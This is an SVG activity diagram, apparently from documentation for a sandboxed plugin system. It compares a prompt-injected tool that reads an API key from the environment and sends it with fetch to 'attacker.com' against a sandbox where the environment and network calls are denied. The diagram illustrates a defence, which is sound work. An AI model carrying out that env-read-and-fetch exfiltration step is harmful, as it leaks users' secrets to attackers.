<?plantuml 1.2026.2?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" contentStyleType="text/css" data-diagram-type="ACTIVITY" height="936px" preserveAspectRatio="none" style="width:870px;height:936px;background:#FFFFFF;" version="1.1" viewBox="0 0 870 936" width="870px" zoomAndPan="magnify"><title>What Happens When a Prompt-Injected Tool Tries to Steal Secrets?</title><defs/><g><g class="title" data-source-line="7"><text fill="#000000" font-family="Verdana" font-size="22" font-weight="bold" lengthAdjust="spacing" textLength="837.9121" x="15" y="37.1182">What Happens When a Prompt-Injected Tool Tries to Steal Secrets?</text></g><rect fill="#FFFFFF" height="17.0146" style="stroke:#FFFFFF;stroke-width:1;" width="788.8442" x="39.5339" y="54.1768"/><ellipse cx="232.5369" cy="86.1914" fill="#FFFFFF" rx="10" ry="10" style="stroke:#000000;stroke-width:1;"/><rect fill="#FDCB6E" height="53.3115" rx="12.5" ry="12.5" style="stroke:#000000;stroke-width:2;" width="264.4326" x="100.3206" y="116.1914"/><text fill="#000000" font-family="Verdana" font-size="14" lengthAdjust="spacing" textLength="124.6602" x="110.3206" y="140.2666">Injected tool calls</text><text fill="#000000" font-family="Courier" font-size="14" lengthAdjust="spacing" textLength="244.4326" x="110.3206" y="156.2012">process.env.ANTHROPIC_API_KEY</text><rect fill="#FF7675" height="54.0293" rx="12.5" ry="12.5" style="stroke:#000000;stroke-width:2;" width="214.3594" x="125.3572" y="189.5029"/><text fill="#000000" font-family="Verdana" font-size="14" lengthAdjust="spacing" textLength="54.5781" x="135.3572" y="213.5781">Returns</text><text fill="#000000" font-family="Courier" font-size="14" lengthAdjust="spacing" textLength="134.8594" x="194.8572" y="213.2158">sk-ant-abc123...</text><text fill="#000000" font-family="Verdana" font-size="14" font-weight="bold" lengthAdjust="spacing" textLength="137.2109" x="135.3572" y="230.5928">Real key exposed</text><rect fill="#FDCB6E" height="53.3115" rx="12.5" ry="12.5" style="stroke:#000000;stroke-width:2;" width="374.0059" x="45.5339" y="263.5322"/><text fill="#000000" font-family="Verdana" font-size="14" lengthAdjust="spacing" textLength="124.6602" x="55.5339" y="287.6074">Injected tool calls</text><text fill="#000000" font-family="Courier" font-size="14" lengthAdjust="spacing" textLength="354.0059" x="55.5339" y="303.542">fetch("https://attacker.com",&#160;{body:&#160;key})</text><rect fill="#FF7675" height="54.0293" rx="12.5" ry="12.5" style="stroke:#000000;stroke-width:2;" width="150.2588" x="157.4075" y="336.8438"/><text fill="#000000" font-family="Verdana" font-size="14" lengthAdjust="spacing" textLength="130.2588" x="167.4075" y="360.9189">Request succeeds.</text><text fill="#000000" font-family="Verdana" font-size="14" font-weight="bold" lengthAdjust="spacing" textLength="121.3447" x="167.4075" y="377.9336">Key exfiltrated.</text><ellipse cx="232.5369" cy="421.873" fill="none" rx="11" ry="11" style="stroke:#000000;stroke-width:1;"/><ellipse cx="232.5369" cy="421.873" fill="#FFFFFF" rx="6" ry="6" style="stroke:#000000;stroke-width:1;"/><line style="stroke:#000000;stroke-width:1;" x1="39.5339" x2="39.5339" y1="54.1768" y2="929.6426"/><ellipse cx="561.7561" cy="452.873" fill="#FFFFFF" rx="10" ry="10" style="stroke:#000000;stroke-width:1;"/><rect fill="#FDCB6E" height="53.3115" rx="12.5" ry="12.5" style="stroke:#000000;stroke-width:2;" width="264.4326" x="429.5398" y="482.873"/><text fill="#000000" font-family="Verdana" font-size="14" lengthAdjust="spacing" textLength="141.4424" x="439.5398" y="506.9482">Injected plugin tries</text><text fill="#000000" font-family="Courier" font-size="14" lengthAdjust="spacing" textLength="244.4326" x="439.5398" y="522.8828">process.env.ANTHROPIC_API_KEY</text><rect fill="#00B894" height="54.0293" rx="12.5" ry="12.5" style="stroke:#000000;stroke-width:2;" width="144.332" x="489.5901" y="556.1846"/><text fill="#000000" font-family="Verdana" font-size="14" lengthAdjust="spacing" textLength="123.1084" x="499.5901" y="580.2598">API doesn't exist.</text><text fill="#000000" font-family="Verdana" font-size="14" font-weight="bold" lengthAdjust="spacing" textLength="124.332" x="499.5901" y="597.2744">ReferenceError.</text><path d="M592.7561,620.2139 L592.7561,646.7358 L572.7561,650.7358 L592.7561,654.7358 L592.7561,681.2578 A0,0 0 0 0 592.7561,681.2578 L808.6692,681.2578 A0,0 0 0 0 808.6692,681.2578 L808.6692,630.2139 L798.6692,620.2139 L592.7561,620.2139 A0,0 0 0 0 592.7561,620.2139" fill="#FFFFFF" style="stroke:#000000;stroke-width:1;"/><path d="M798.6692,620.2139 L798.6692,630.2139 L808.6692,630.2139 L798.6692,620.2139" fill="#FFFFFF" style="stroke:#000000;stroke-width:1;"/><text fill="#000000" font-family="Verdana" font-size="14" lengthAdjust="spacing" textLength="194.9131" x="598.7561" y="639.2891">Even if the plugin somehow</text><text fill="#000000" font-family="Verdana" font-size="14" lengthAdjust="spacing" textLength="190.5723" x="598.7561" y="656.3037">obtained a secret, the next</text><text fill="#000000" font-family="Verdana" font-size="14" lengthAdjust="spacing" textLength="102.4229" x="598.7561" y="673.3184">step also fails:</text><ellipse cx="561.7561" cy="650.7358" fill="none" rx="11" ry="11" style="stroke:#000000;stroke-width:1;"/><ellipse cx="561.7561" cy="650.7358" fill="#FFFFFF" rx="6" ry="6" style="stroke:#000000;stroke-width:1;"/><ellipse cx="561.7561" cy="701.2578" fill="#FFFFFF" rx="10" ry="10" style="stroke:#000000;stroke-width:1;"/><rect fill="#FDCB6E" height="53.3115" rx="12.5" ry="12.5" style="stroke:#000000;stroke-width:2;" width="264.4326" x="429.5398" y="731.2578"/><text fill="#000000" font-family="Verdana" font-size="14" lengthAdjust="spacing" textLength="141.4424" x="439.5398" y="755.333">Injected plugin tries</text><text fill="#000000" font-family="Courier" font-size="14" lengthAdjust="spacing" textLength="244.4326" x="439.5398" y="771.2676">fetch("https://attacker.com")</text><rect fill="#00B894" height="54.0293" rx="12.5" ry="12.5" style="stroke:#000000;stroke-width:2;" width="191.6982" x="465.907" y="804.5693"/><text fill="#000000" font-family="Courier" font-size="14" lengthAdjust="spacing" textLength="101.1445" x="475.907" y="828.2822">allowedHosts</text><text fill="#000000" font-family="Verdana" font-size="14" lengthAdjust="spacing" textLength="65.6318" x="581.9734" y="828.6445">is empty.</text><text fill="#000000" font-family="Verdana" font-size="14" font-weight="bold" lengthAdjust="spacing" textLength="126.7656" x="475.907" y="845.6592">Request denied.</text><path d="M592.7561,868.5986 L592.7561,895.1206 L572.7561,899.1206 L592.7561,903.1206 L592.7561,929.6426 A0,0 0 0 0 592.7561,929.6426 L821.9172,929.6426 A0,0 0 0 0 821.9172,929.6426 L821.9172,878.5986 L811.9172,868.5986 L592.7561,868.5986 A0,0 0 0 0 592.7561,868.5986" fill="#FFFFFF" style="stroke:#000000;stroke-width:1;"/><path d="M811.9172,868.5986 L811.9172,878.5986 L821.9172,878.5986 L811.9172,868.5986" fill="#FFFFFF" style="stroke:#000000;stroke-width:1;"/><text fill="#000000" font-family="Verdana" font-size="14" lengthAdjust="spacing" textLength="208.1611" x="598.7561" y="887.6738">No shell, no env, no network,</text><text fill="#000000" font-family="Verdana" font-size="14" lengthAdjust="spacing" textLength="193.0469" x="598.7561" y="904.6885">no filesystem &#8212; by default.</text><text fill="#000000" font-family="Verdana" font-size="14" lengthAdjust="spacing" textLength="146.248" x="598.7561" y="921.7031">The attack surface is</text><text fill="#000000" font-family="Verdana" font-size="14" font-weight="bold" lengthAdjust="spacing" textLength="34.2207" x="749.926" y="921.7031">zero</text><text fill="#000000" font-family="Verdana" font-size="14" lengthAdjust="spacing" textLength="5.0928" x="784.1467" y="921.7031">.</text><ellipse cx="561.7561" cy="899.1206" fill="none" rx="11" ry="11" style="stroke:#000000;stroke-width:1;"/><ellipse cx="561.7561" cy="899.1206" fill="#FFFFFF" rx="6" ry="6" style="stroke